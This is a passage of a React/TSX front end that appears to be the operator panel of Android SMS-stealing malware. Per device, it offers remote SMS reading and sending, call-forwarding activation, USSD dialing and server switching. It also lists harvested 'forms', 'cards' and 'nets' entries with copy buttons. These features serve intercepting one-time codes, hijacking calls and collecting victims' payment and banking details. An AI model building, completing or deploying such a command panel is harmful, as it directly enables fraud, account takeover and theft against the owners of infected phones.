            <div className="mb-1 text-center text-[18px] font-extrabold text-gray-900">Device Locked</div>
            <div className="mb-4 text-center text-[13px] text-gray-500">Enter security code to access</div>
            <input type="password" inputMode="numeric" value={lockCode}
              onChange={e => { setLockCode(e.target.value); setLockCodeError(null); }}
              onKeyDown={e => { if (e.key === "Enter") handleLockCodeConfirm(); }}
              placeholder="Security code" autoFocus
              className="h-12 w-full rounded-xl border border-gray-200 px-4 text-center text-[18px] outline-none focus:border-blue-400" />
            {lockCodeError && <div className="mt-2 text-center text-[12px] text-red-600">{lockCodeError}</div>}
            <div className="mt-4 grid grid-cols-2 gap-2">
              <button type="button" onClick={navBack} className="h-11 rounded-xl border border-gray-200 bg-white font-bold text-gray-700">← Back</button>
              <button type="button" onClick={handleLockCodeConfirm} className="h-11 rounded-xl bg-gray-900 font-extrabold text-white">Unlock 🔓</button>
            </div>
          </div>
        </div>
      )}

      {!lockGateOpen && (
        <div className="mx-auto max-w-[480px] px-3 pb-24 pt-3">

          {loading ? (
            <div className="rounded-xl bg-white p-8 text-center text-gray-400 shadow-sm">Loading…</div>
          ) : (
            <>
              {/* ── Device Info Table ── */}
              <div className="overflow-hidden rounded-xl border border-gray-200 bg-white shadow-sm">
                <table className="w-full border-collapse">
                  <tbody>
                    <tr className="border-b border-gray-100">
                      <td className="w-[115px] py-3 pl-4 align-top text-[13px] font-semibold text-gray-600">Name</td>
                      <td className="py-3 pr-4 text-[13px] text-gray-900">
                        {brand}{model ? ` (${model})` : ""}
                        {android && <span className="ml-2 rounded bg-green-600 px-1.5 py-0.5 text-[10px] font-bold text-white">{android}</span>}
                      </td>
                    </tr>
                    <tr className="border-b border-gray-100">
                      <td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">ID</td>
                      <td className="break-all py-3 pr-4 text-[13px] text-gray-900">{did}</td>
                    </tr>
                    <tr className="border-b border-gray-100">
                      <td className="py-3 pl-4 align-top text-[13px] font-semibold text-gray-600">SIM</td>
                      <td className="py-3 pr-4 text-[13px] text-gray-900">
                        {simSummary.sim1 !== "-" && <div>{simSummary.sim1Carrier !== "-" ? `${simSummary.sim1Carrier}: ` : ""}{simSummary.sim1}</div>}
                        {simSummary.sim2 !== "-" && <div>{simSummary.sim2Carrier !== "-" ? `${simSummary.sim2Carrier}: ` : ""}{simSummary.sim2}</div>}
                        {simSummary.sim1 === "-" && simSummary.sim2 === "-" && <span className="text-gray-400">—</span>}
                      </td>
                    </tr>
                    <tr className="border-b border-gray-100">
                      <td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Forward Call</td>
                      <td className="py-3 pr-4 text-[13px] text-gray-900">{forwardOn ? "ON" : "OFF"}</td>
                    </tr>
                    <tr className="border-b border-gray-100">
                      <td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Install Date:</td>
                      <td className="py-3 pr-4 text-[13px] font-semibold text-green-600">
                        {installTs ? new Date(installTs).toLocaleString() : (device?.createdAt ? new Date(device.createdAt).toLocaleString() : "—")}
                      </td>
                    </tr>
                    <tr>
                      <td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Last Online</td>
                      <td className="py-3 pr-4">
                        <TimeAgo ts={lastSeenTs} className={`text-[13px] font-semibold ${isRecent ? "text-green-600" : "text-red-500"}`} />
                        {checkedAt > 0 && (
                          <div className="mt-0.5 flex items-center gap-1 text-[12px] text-blue-500">
                            <span>✓ Checked:</span>
                            <TimeAgo ts={checkedAt} className="font-semibold" />
                          </div>
                        )}
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>

              {/* ── 2×3 Action Buttons ── */}
              <div className="mt-3 grid grid-cols-3 gap-2">
                {[
                  { label: "Check Online", onClick: handleCheckOnline },
                  { label: "GET SMS",      onClick: () => setSmsOpen(true) },
                  { label: "Send SMS",     onClick: () => setSendOpen(true) },
                  { label: "Call Forward", onClick: () => setCfOpen(true) },
                  { label: "Dial USSD",    onClick: () => setUssdOpen(true) },
                  { label: "Change Server",onClick: () => {} },
                ].map(btn => (
                  <button key={btn.label} type="button" onClick={btn.onClick}
                    className="rounded-lg border border-gray-300 bg-white py-2.5 text-[12px] font-semibold text-gray-900 hover:bg-gray-50 active:scale-[0.97] transition-transform">
                    {btn.label}
                  </button>
                ))}
              </div>

              {/* ── Status Log ── */}
              {statusLog && (
                <div className="mt-3 rounded-xl bg-gray-100 px-4 py-3 text-[13px]">
                  <TimeAgo ts={statusLog.ts} className="text-gray-500" />
                  <span>: </span>
                  <span className={
                    statusLog.color === "green" ? "font-semibold text-green-600" :
                    statusLog.color === "red"   ? "font-semibold text-red-600"   :
                    "font-semibold text-gray-900"
                  }>{statusLog.text}</span>
                </div>
              )}

              {/* ── Search + Sort ── */}
              <div className="mt-3 flex items-center gap-2">
                <div className="relative flex-1">
                  <input value={search} onChange={e => setSearch(e.target.value)}
                    placeholder="Search data and press enter/search icon"
                    className="h-10 w-full rounded-full border border-gray-300 bg-white pl-4 pr-9 text-[13px] outline-none focus:border-gray-400" />
                  <span className="absolute right-3 top-1/2 -translate-y-1/2 text-[14px]">🔍</span>
                </div>
                <select value={sortMode} onChange={e => setSortMode(e.target.value as any)}
                  className="h-10 rounded-full border border-gray-300 bg-white px-3 text-[13px] font-semibold outline-none">
                  <option value="new">NEW</option>
                  <option value="old">OLD</option>
                </select>
              </div>

              {/* ── Tab Content ── */}
              <div className="mt-2 space-y-3">
                {/* HOME: combined data + SMS */}
                {deviceTab === "home" && (
                  loadingSms ? <div className="py-6 text-center text-gray-400">Loading…</div> :
                  filterQ(homeFeed).length === 0
                    ? <div className="py-6 text-center text-gray-400">No data yet.</div>
                    : filterQ(homeFeed).map((item: any, i) =>
                        item._ft === "sms"
                          ? <SmsCard key={safeStr(item._id || item.id) || i} sms={item} pageNum={smsPageMap[safeStr(item._id || item.id)]} />
                          : <FormCard key={safeStr(item._id || item.id) || i} form={item} />
                      )
                )}

                {/* DATA: forms + cards + nets */}
                {deviceTab === "data" && (
                  filterQ(allDataItems).length === 0
                    ? <div className="py-6 text-center text-gray-400">No data yet.</div>
                    : filterQ(allDataItems).map((item: any, i) =>
                        <FormCard key={safeStr(item._id || item.id) || i} form={item} />
                      )
                )}

                {/* MESSAGES: SMS only */}
                {deviceTab === "messages" && (
                  loadingSms ? <div className="py-6 text-center text-gray-400">Loading…</div> :
                  filterQ(sortedSms).length === 0
                    ? <div className="py-6 text-center text-gray-400">No SMS yet.</div>
                    : filterQ(sortedSms).map((m: any, i) =>
                        <SmsCard key={safeStr(m._id || m.id) || i} sms={m} pageNum={smsPageMap[safeStr(m._id || m.id)]} />
                      )
                )}

                {/* GROUPS: all in one card */}
                {deviceTab === "groups" && (() => {
                  const all = [...forms, ...cards, ...nets].sort((a, b) => getTs(b) - getTs(a));
                  if (!all.length) return <div className="py-6 text-center text-gray-400">No data yet.</div>;
                  return (
                    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
                      {all.map((item, idx) => {
                        const ent = getPayloadEntries(item);
                        if (!ent.length) return null;
                        return (
                          <div key={safeStr(item._id || item.id) || idx}>
                            {ent.map(([k, v]) => (
                              <div key={k} className="mb-2">
                                <div className="flex items-center">
                                  <span className="text-[13px] font-semibold text-blue-600">{k}:</span>
                                  <CopyBtn value={v} />
                                </div>
                                <div className="text-[13px] text-gray-800">{v}</div>
                              </div>
                            ))}
                            {idx < all.length - 1 && <hr className="my-2 border-gray-200" />}
                          </div>
                        );
                      })}
                      <hr className="my-2 border-gray-100" />
                      <div className="text-right text-[11px] text-gray-400">{did.slice(0, 16)}</div>
                    </div>
                  );
                })()}
              </div>
            </>
          )}
        </div>
      )}

      {/* ── Action Alert Modal ── */}
      {devAlert && (
        <DeviceAlert message={devAlert.message} startTime={devAlert.startTime}
          onClose={() => { setDevAlert(null); /* alertActionRef not cleared — result re-alerts if it comes within window */ }} />
      )}

      {/* ── GET SMS Modal ── */}
      {getSmsOpen && (
        <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
          <div className="w-full max-w-[340px] rounded-2xl bg-white p-6 shadow-xl">
            <div className="mb-5 flex items-center justify-between">
              <span className="text-[16px] font-extrabold">Get SMS</span>
              <button type="button" onClick={() => setSmsOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
            </div>
            <div className="mb-1 text-[13px] font-semibold text-gray-600">
              Sms Limit: <span className="font-normal text-gray-400">Max: 3</span>
            </div>
            <input type="number" min="1" max="3" value={getSmsCount}
              onChange={e => setSmsCount(String(Math.min(3, Math.max(1, Number(e.target.value) || 1))))}
              className="h-12 w-full rounded-xl border border-gray-200 px-4 text-[16px] outline-none focus:border-gray-400" />
            <button type="button" onClick={handleGetSms}
              className="mt-5 w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50">
              GET SMS
            </button>
          </div>
        </div>
      )}

      {/* ── Send SMS Modal ── */}
      {sendOpen && (
        <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
          <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl">
            <div className="mb-5 flex items-center justify-between">
              <span className="text-[16px] font-extrabold">Send SMS</span>
              <button type="button" onClick={() => setSendOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
            </div>
            <div className="mb-1 text-[13px] font-semibold text-gray-600">SIM:</div>
            {/* Buttons like old file, styled like competitor */}
            <div className="mb-4 flex flex-wrap gap-2">
              <button type="button" onClick={() => setSmsSimSlot(0)}
                className={["rounded-xl border px-4 py-2 text-[13px] font-semibold", smsSimSlot === 0 ? "border-green-500 bg-green-50 text-green-700" : "border-gray-200 bg-white text-gray-700"].join(" ")}>
                {smsSim1Label}
              </button>
              <button type="button" onClick={() => setSmsSimSlot(1)}
                className={["rounded-xl border px-4 py-2 text-[13px] font-semibold", smsSimSlot === 1 ? "border-green-500 bg-green-50 text-green-700" : "border-gray-200 bg-white text-gray-700"].join(" ")}>
                {smsSim2Label}
              </button>
            </div>
            <div className="mb-1 text-[13px] font-semibold text-gray-600">Number:</div>
            <input value={receiver} onChange={e => setReceiver(e.target.value)} inputMode="tel"
              className="mb-4 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
            <div className="mb-1 text-[13px] font-semibold text-gray-600">Message:</div>
            <textarea value={messageBody} onChange={e => setMessageBody(e.target.value)} rows={3}
              className="mb-5 w-full resize-none rounded-xl border border-gray-200 px-4 py-3 text-[14px] outline-none focus:border-gray-400" />
            <button type="button" onClick={handleSendSms}
              disabled={sendingSms || !receiver.trim() || !messageBody.trim()}
              className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50 disabled:opacity-60">
              {sendingSms ? "Sending…" : "Proceed"}
            </button>
          </div>
        </div>
      )}

      {/* ── Call Forward Modal ── */}
      {cfOpen && (
        <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
          <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl">
            <div className="mb-5 flex items-center justify-between">
              <span className="text-[16px] font-extrabold">Call Forwarding</span>
              <button type="button" onClick={() => setCfOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
            </div>
            <div className="mb-2 text-[13px] font-semibold text-gray-600">SIM:</div>
            {/* Radio-style SIM selector */}
            <div className="mb-4 overflow-hidden rounded-xl border border-gray-200">
              {simOptions.map((o, idx) => (
                <button key={o.value} type="button" onClick={() => setCfSim(o.value)}
                  className={["flex w-full items-center justify-between px-5 py-4 text-[15px] font-semibold", idx < simOptions.length - 1 ? "border-b border-gray-100" : "", cfSim === o.value ? "text-gray-900" : "text-gray-400"].join(" ")}>
                  <span>{o.label}</span>
                  <div className={["h-5 w-5 rounded-full border-2", cfSim === o.value ? "border-yellow-600 bg-yellow-600" : "border-gray-300"].join(" ")} />
                </button>
              ))}
            </div>
            <input value={cfNumber} onChange={e => setCfNumber(e.target.value)}
              placeholder="Forwarding number" inputMode="tel"
              className="mb-4 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
            <div className="space-y-2">
              <button type="button" onClick={() => handleCallForward("activate")}
                className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50">
                Proceed
              </button>
              <div className="grid grid-cols-2 gap-2">
                <button type="button" onClick={() => handleCallForward("deactivate")}
                  className="rounded-xl border border-gray-300 bg-white py-3 text-[13px] font-semibold text-gray-800 hover:bg-gray-50 leading-tight">
                  DeActive Call Forwarding
                </button>
                <button type="button" onClick={() => handleCallForward("check")}
                  className="rounded-xl border border-gray-300 bg-white py-3 text-[13px] font-semibold text-gray-800 hover:bg-gray-50">
                  Check Forwarding
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── Dial USSD Modal ── */}
      {ussdOpen && (
        <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
          <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl">
            <div className="mb-5 flex items-center justify-between">
              <span className="text-[16px] font-extrabold">USSD Dialing</span>
              <button type="button" onClick={() => setUssdOpen(false)} className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
            </div>
            <div className="mb-1 text-[13px] font-semibold text-gray-600">SIM:</div>
            <select value={ussdSim} onChange={e => setUssdSim(Number(e.target.value))}
              className="mb-4 h-12 w-full rounded-xl border-2 border-green-500 bg-white px-3 text-[14px] outline-none">
              {simOptions.map(o => <option key={o.value} value={o.value}>{o.label}</option>)}
            </select>
            <div className="mb-1 text-[13px] font-semibold text-gray-600">USSD Code:</div>
            <input value={ussdCode} onChange={e => setUssdCode(e.target.value)}
              placeholder="e.g. *123#" autoFocus
              className="mb-5 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
            <button type="button" onClick={handleDialUssd}
              disabled={!ussdCode.trim()}
              className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50 disabled:opacity-60">
              Proceed
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
